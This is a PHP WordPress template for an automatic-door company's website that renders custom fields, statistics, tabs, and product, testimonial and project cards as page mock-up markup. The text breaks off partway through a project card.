<?php
get_header();
?>

<?php
$cta_button = get_field('cta_button');
$square_image = get_field('square_image');
$title = get_field('title');
$description = get_field('description');
$image = get_field('image');

?>

<!-- cta-->
<?php if (!empty($cta_button) && is_array($cta_button)) { ?>
  <a class="cta-button light-cta" href="<?= $cta_button['url'] ?>" target="<?= $cta_button['target'] ?>"><?= $cta_button['title'] ?></a>
<?php } ?>

<!-- image -->
<div>
  <?php
  $picture_class = 'aspect-ratio';
  echo bis_get_attachment_picture(
    $square_image,
    [
      375 => [156, 191, 1],
      1024 => [165, 202, 1],
      1280 => [208, 255, 1],
      1440 => [234, 287, 1],
      1920 => [314, 385, 1],
      3840 => [314, 385, 1]
    ],
    [
      'retina' => true, 'picture_class' => $picture_class,
    ],
  );
  ?>
</div>

<!--$title -->
<?php if ($title): ?>
  <h3 class="en-h3"><?= $title ?></h3>
<?php endif; ?>

<!-- $description-->
<?php if ($description): ?>
  <div class="body description white-color"><?= $description ?></div>
<?php endif; ?>
<!-- image -->
<?php if (!empty($image) && is_array($image)) { ?>
  <picture class="image-wrapper">
    <img src="<?= $image['url'] ?>" alt="<?= $image['alt'] ?>">
  </picture>
<?php } ?>
<!-- Repeater-->

<?php if (have_rows('statistics')) { ?>
  <div class="statistics-wrapper">
    <?php while (have_rows('statistics')) {
      the_row();
      $number = get_sub_field('number');
      $text = get_sub_field('text');
      ?>
      <div class="statistic">
        <?php if ($number) { ?>
          <div class="number sans-h2 off-white-color"><?= $number ?></div>
        <?php } ?>
        <?php if ($text) { ?>
          <div class="text body gray-color capital-textw"><?= $text ?></div>
        <?php } ?>
      </div>
    <?php } ?>
  </div>
<?php } ?>


<div class="container">
  <div class="cards-wrapper project-card">
    <div class="left-image">
      <picture class="aspect-ratio image-wrapper image-hover-effect">
        <img src="data:image/jpeg;base64,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" alt="">
      </picture>
    </div>
    <div class="right-content">
      <a href="" class="post-title body navy-color bold">Full Automated Access
        at Heathrow</a>
      <a class="location body-2 navy-tint-color" href="">
        <svg width="11" height="13" viewBox="0 0 11 13" fill="none" aria-hidden="true">
          <path fill-rule="evenodd" clip-rule="evenodd" d="M6.21637 11.5082C6.02535 11.6977 5.83308 11.8883 5.64082 12.0806C5.44856 11.8883 5.2563 11.6977 5.06527 11.5082C2.8717 9.33303 0.84082 7.31917 0.84082 4.88057C0.84082 2.2296 2.98985 0.0805664 5.64082 0.0805664C8.29179 0.0805664 10.4408 2.2296 10.4408 4.88057C10.4408 7.31917 8.40994 9.33303 6.21637 11.5082ZM7.44082 4.88057C7.44082 5.87468 6.63493 6.68057 5.64082 6.68057C4.64671 6.68057 3.84082 5.87468 3.84082 4.88057C3.84082 3.88645 4.64671 3.08057 5.64082 3.08057C6.63493 3.08057 7.44082 3.88645 7.44082 4.88057Z" fill="#818093"/>
        </svg>
        Central London
      </a>
      <span class="excerpt captions center-content">This area was originally an open walkway and our Customer wanted a sliding door with electric locking...</span>
      <a href="" class="cta-button blue-cta permalink body navy-color medium">
        Read more
      </a>
    </div>
  </div>
</div>
<svg width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true">
  <path d="M16.0339 8.61946H5.26195L8.21058 5.67085L6.94689 4.40717L1.89209 9.46194L6.94687 14.5167L8.21055 13.253L5.26195 10.3044H16.0339V8.61946Z" fill="#0B0A40"/>
</svg>
<br>
<br>
<br>
<br>
<div class="container">
  <!--      region  tabs -->
  <div class="tabs hide-scrollbar">
    <div class="tab body medium" data-tab="1" role="button" tabindex="0" aria-label="Tab Healthcare" aria-selected="true">
      Healthcare
    </div>
    <div class="tab body medium" data-tab="2" role="button" tabindex="0" aria-label="Tab Education" aria-selected="false">
      Education
    </div>
    <div class="tab body medium" data-tab="3" role="button" tabindex="0" aria-label="Tab Retail" aria-selected="false">
      Retail
    </div>
    <div class="tab body medium" data-tab="3" role="button" tabindex="0" aria-label="Tab Construction" aria-selected="false">
      Construction
    </div>
    <div class="tab body medium" data-tab="3" role="button" tabindex="0" aria-label="Tab Leisure" aria-selected="false">
      Leisure
    </div>
    <div class="tab body medium" data-tab="3" role="button" tabindex="0" aria-label="Tab Corporate" aria-selected="false">
      Corporate
    </div>
  </div>
  <!--       endregion-->
</div>
<br>
<br>
<br>
<br>
<div class="container">
  <!--   product-card -->
  <div class="row">
    <div class="col-6 col-md-3">
      <div class="product-card">
        <picture class="featured-image">
          <img src=" <?= get_template_directory_uri() . '/images/hero-image.png' ?>" alt="trustpilot">
        </picture>
        <h3 class="category center-content captions">Automatic</h3>
        <h6 class="bold en-h6 product-title center-content">Sliding doors</h6>
        <div class="excerpt captions center-content">Seamlessly designed for
          hands-free entry
        </div>
        <a class="cta-button center-content product-btn" href="">Learn more</a>
      </div>
    </div>
    <div class="col-6 col-md-3">
      <div class="product-card">
        <picture class="featured-image">
          <img src=" <?= get_template_directory_uri() . '/images/hero-image.png' ?>" alt="trustpilot">
        </picture>
        <h3 class="category center-content captions">Automatic</h3>
        <h6 class="bold en-h6 product-title center-content">Sliding doors</h6>
        <div class="excerpt captions center-content">Seamlessly designed for
          hands-free entry
        </div>
        <a class="cta-button center-content product-btn" href="">Learn more</a>
      </div>

    </div>
    <div class="col-6 col-md-3">
      <div class="product-card">
        <picture class="featured-image">
          <img src=" <?= get_template_directory_uri() . '/images/hero-image.png' ?>" alt="trustpilot">
        </picture>
        <h3 class="category center-content captions">Automatic</h3>
        <h6 class="bold en-h6 product-title center-content">Sliding doors</h6>
        <div class="excerpt captions center-content">Seamlessly designed for
          hands-free entry
        </div>
        <a class="cta-button center-content product-btn" href="">Learn more</a>
      </div>

    </div>
    <div class="col-6 col-md-3">
      <div class="product-card">
        <picture class="featured-image">
          <img src=" <?= get_template_directory_uri() . '/images/hero-image.png' ?>" alt="trustpilot">
        </picture>
        <h3 class="category center-content captions">Automatic</h3>
        <h6 class="bold en-h6 product-title center-content">Sliding doors</h6>
        <div class="excerpt captions center-content">Seamlessly designed for
          hands-free entry
        </div>
        <a class="cta-button center-content product-btn" href="">Learn more</a>
      </div>

    </div>
  </div>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <!--   testimonials-card -->
  <div class="row">
    <div class="col-6 col-md-3">
      <div class="testimonials-card">
        <div class="video-wrapper">
          <button aria-label="Play Video" class="play-button">
            <svg class="play-video" width="80" height="79" viewBox="0 0 80 79" role="img" aria-hidden="false" focusable="true">
              <title>Play Video</title>
              <path opacity="0.3" d="M0.878754 39.5C0.878754 17.788 18.538 0.128754 40.25 0.128754C61.962 0.128754 79.6212 17.788 79.6212 39.5C79.6212 61.1991 61.9629 78.8712 40.25 78.8712C18.5371 78.8712 0.878754 61.1991 0.878754 39.5Z" fill="white"/>
              <path d="M50.6149 41.0425L37.4612 48.6392C35.9932 49.4809 34.7847 48.7903 34.7847 47.096V31.9027C34.7847 30.2084 35.9932 29.507 37.4612 30.3595L50.6149 37.9562C52.0821 38.798 52.0821 40.19 50.6149 41.0425Z" fill="white"/>
            </svg>
          </button>
          <video playsinline autoplay muted loop src="http://localhost/huntandhawk/wp-content/uploads/2024/11/mov_bbb.mp4" class="video-player" data-video-type="video_file"></video>
        </div>
        <div class="title body-2 navy-color medium">
          “Entec provide an excellent service over the phone and on site, every
          job gets treated with the same high
          standard
          and the installation engineers are very helpful, reliable and
          knowledgeable.”
        </div>
        <div class="card-info">
          <picture class="stars cover-image">
            <img src=" <?= get_template_directory_uri() . '/images/stars.png' ?>" alt="stars">
          </picture>
          <div class="name body-2 navy-color bold">Ethan Walker</div>
          <div class="jop-title captions regular navy-color  navy-tint-color">
            Facility Manager, John Lewis
          </div>
        </div>
      </div>
    </div>
    <!--     video card-->
    <div class="col-6 col-md-3">
      <div class="testimonials-card has-video">
        <div class="video-wrapper media-wrapper">
          <button aria-label="Play Video" class="play-button">
            <svg class="play-video" width="80" height="79" viewBox="0 0 80 79" role="img" aria-hidden="false" focusable="true">
              <title>Play Video</title>
              <path opacity="0.3" d="M0.878754 39.5C0.878754 17.788 18.538 0.128754 40.25 0.128754C61.962 0.128754 79.6212 17.788 79.6212 39.5C79.6212 61.1991 61.9629 78.8712 40.25 78.8712C18.5371 78.8712 0.878754 61.1991 0.878754 39.5Z" fill="white"/>
              <path d="M50.6149 41.0425L37.4612 48.6392C35.9932 49.4809 34.7847 48.7903 34.7847 47.096V31.9027C34.7847 30.2084 35.9932 29.507 37.4612 30.3595L50.6149 37.9562C52.0821 38.798 52.0821 40.19 50.6149 41.0425Z" fill="white"/>
            </svg>
          </button>
          <video playsinline autoplay muted loop src="http://localhost/huntandhawk/wp-content/uploads/2024/11/mov_bbb.mp4" class="video-player" data-video-type="video_file"></video>
        </div>
        <div class="title body-2 navy-color medium">
          “Entec provide an excellent service over the phone and on site, every
          job gets treated with the same high
          standard
          and the installation engineers are very helpful, reliable and
          knowledgeable.”
        </div>
        <div class="card-info">
          <picture class="stars cover-image">
            <img src=" <?= get_template_directory_uri() . '/images/stars.png' ?>" alt="stars">
          </picture>
          <div class="name body-2 navy-color bold">Ethan Walker</div>
          <div class="jop-title captions regular navy-color  navy-tint-color">
            Facility Manager, John Lewis
          </div>
        </div>
      </div>
    </div>
    <!--     image card-->
    <div class="col-6 col-md-3">
      <div class="testimonials-card has-image">
        <picture class="image-wrapper media-wrapper cover-image">
          <img src=" <?= get_template_directory_uri() . '/images/hero-image.png' ?>" alt="stars">
        </picture>
        <div class="card-info">
          <div class="name body-2 navy-color bold">Jakie C.</div>
          <div class="jop-title captions regular navy-color  navy-tint-color">
            Commercial Director Entec Systems
          </div>
        </div>
      </div>
    </div>
  </div>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
  <!--   project-card -->
  <div class="row">
    <div class="col-6 col-md-4">
      <div class="project-card">
        <a href="#" target="_self">
          <picture class="aspect-ratio image-wrapper image-hover-effect">
            <img src=" <?= get_template_directory_uri() . '/images/hero-image.png' ?>" alt="trustpilot">
          </picture>
        </a>
        <a href="#" target="_self" class="post-title body navy-color bold">Central
          London Vet</a>
        <a class="location body-2 navy-tint-color" href="#" target="">
          <svg width="11" height="13" viewBox="0 0 11 13" fill="none" aria-hidden="true">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M6.21637 11.5082C6.02535 11.6977 5.83308 11.8883 5.64082 12.0806C5.44856 11.8883 5.2563 11.6977 5.06527 11.5082C2.8717 9.33303 0.84082 7.31917 0.84082 4.88057C0.84082 2.2296 2.98985 0.0805664 5.64082 0.0805664C8.29179 0.0805664 10.4408 2.2296 10.4408 4.88057C10.4408 7.31917 8.40994 9.33303 6.21637 11.5082ZM7.44082 4.88057C7.44082 5.87468 6.63493 6.68057 5.64082 6.68057C4.64671 6.68057 3.84082 5.87468 3.84082 4.88057C3.84082 3.88645 4.64671 3.08057 5.64082 3.08057C6.63493 3.08057 7.44082 3.88645 7.44082 4.88057Z" fill="#818093"></path>
          </svg>
          Central London </a>
      </div>
    </div>
    <div class="col-6 col-md-4">
      <div class="project-card">
        <a href="#" target="_self">
          <picture class="aspect-ratio image-wrapper image-hover-effect">
            <img src=" <?= get_template_directory_uri() . '/images/hero-image.png' ?>" alt="trustpilot">
          </picture>
        </a>
        <a href="#" target="_self" class="post-title body navy-color bold">Central
          London Vet</a>
        <a class="location body-2 navy-tint-color" href="#" target="">
          <svg width="11" height="13" viewBox="0 0 11 13" fill="none" aria-hidden="true">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M6.21637 11.5082C6.02535 11.6977 5.83308 11.8883 5.64082 12.0806C5.44856 11.8883 5.2563 11.6977 5.06527 11.5082C2.8717 9.33303 0.84082 7.31917 0.84082 4.88057C0.84082 2.2296 2.98985 0.0805664 5.64082 0.0805664C8.29179 0.0805664 10.4408 2.2296 10.4408 4.88057C10.4408 7.31917 8.40994 9.33303 6.21637 11.5082ZM7.44082 4.88057C7.44082 5.87468 6.63493 6.68057 5.64082 6.68057C4.64671 6.68057 3.84082 5.87468 3.84082 4.88057C3.84082 3.88645 4.64671 3.08057 5.64082 3.08057C6.63493 3.08057 7.44082 3.88645 7.44082 4.88057Z" fill="#818093"></path>
          </svg>
          Central London </a>
      </div>
    </div>
    <div class="col-6 col-md-4">
      <div class="project-card">
        <a href="#" target="_self">
          <picture class="aspect-ratio image-wrapper image-hover-effect">
            <img src=" <?= get_template_directory_uri() . '/images/hero-image.png' ?>" alt="trustpilot">
          </picture>
        </a>
        <a href="#" target="_self" class="post-title body navy-color bold">Central
          London Vet</a>
        <a class="location body-2 navy-tint-color" href="#" target="">
          <svg width="11" height="13" viewBox="0 0 11 13" fill="none" aria-hidden="true">
